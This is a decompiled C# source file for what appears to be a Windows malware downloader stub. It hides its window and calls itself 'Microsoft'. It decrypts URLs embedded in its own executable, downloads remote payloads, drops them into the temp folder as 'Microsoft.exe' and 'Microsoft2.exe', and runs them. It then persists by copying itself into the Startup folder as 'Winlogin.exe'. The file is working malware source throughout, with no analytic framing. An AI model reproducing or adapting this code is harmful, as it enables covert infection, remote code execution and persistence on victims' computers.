using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Lounge.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Lounge;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private string cfile;

	private string cbind;

	private string encryption;

	private string startup;

	private string checkbind;

	private string something;

	private string filesplitter;

	private string[] Drop;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		something = File.ReadAllText(Application.get_ExecutablePath());
		filesplitter = "FileSplitter";
		Drop = Strings.Split(something, filesplitter, -1, (CompareMethod)0);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Microsoft");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_Opacity(0.0);
		Thread thread = new Thread(start);
		thread.Start();
	}

	public void start()
	{
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		encryption = Drop[1];
		cfile = AES_Decrypt(Drop[2], encryption);
		cbind = AES_Decrypt(Drop[3], encryption);
		startup = Drop[4];
		checkbind = Drop[5];
		byte[] bytes = Convert.FromBase64String(DecompressString(readweb(cfile)));
		string text = Path.GetTempPath() + "Microsoft.exe";
		File.WriteAllBytes(text, bytes);
		Process.Start(text);
		if (Conversions.ToBoolean(checkbind))
		{
			byte[] bytes2 = Convert.FromBase64String(DecompressString(readweb(cbind)));
			string text2 = Path.GetTempPath() + "Microsoft2.exe";
			File.WriteAllBytes(text2, bytes2);
			Process.Start(text2);
		}
		Timer val = new Timer();
		val.set_Interval(200);
		val.add_Tick((EventHandler)Persistence);
		val.Start();
	}

	public static string DecompressString(string compressedText)
	{
		checked
		{
			try
			{
				byte[] array = Convert.FromBase64String(compressedText);
				using MemoryStream memoryStream = new MemoryStream();
				int num = BitConverter.ToInt32(array, 0);
				memoryStream.Write(array, 4, array.Length - 4);
				byte[] array2 = new byte[num - 1 + 1];
				memoryStream.Position = 0L;
				using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
				{
					gZipStream.Read(array2, 0, array2.Length);
				}
				return Encoding.UTF8.GetString(array2);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return null;
		}
	}

	private static string readweb(string url)
	{
		try
		{
			WebClient webClient = new WebClient();
			Stream stream = webClient.OpenRead(url);
			StreamReader streamReader = new StreamReader(stream);
			return streamReader.ReadToEnd();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}

	public string DES_Decrypt(string input, string pass)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[8];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 8);
			dESCryptoServiceProvider.Key = array;
			dESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = dESCryptoServiceProvider.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string AES_Decrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Persistence(object sender, EventArgs e)
	{
		if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("XP"))
		{
			try
			{
				if (!Directory.Exists("C:\\users\\" + Environment.UserName + "\\Start Menu\\Programs\\Startup\\Winlogin.exe"))
				{
					Directory.CreateDirectory("C:\\users\\" + Environment.UserName + "\\Start Menu\\Programs\\Startup\\");
				}
				if (!File.Exists("C:\\users\\" + Environment.UserName + "\\Start Menu\\Programs\\Startup\\Winlogin.exe"))
				{
					FileSystem.FileCopy(Application.get_ExecutablePath(), "C:\\users\\" + Environment.UserName + "\\Start Menu\\Programs\\Startup\\Winlogin.exe");
				}
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			if (!Directory.Exists("C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Winlogin.exe"))
			{
				Directory.CreateDirectory("C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
			}
			if (!File.Exists("C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Winlogin.exe"))
			{
				FileSystem.FileCopy(Application.get_ExecutablePath(), "C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Winlogin.exe");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
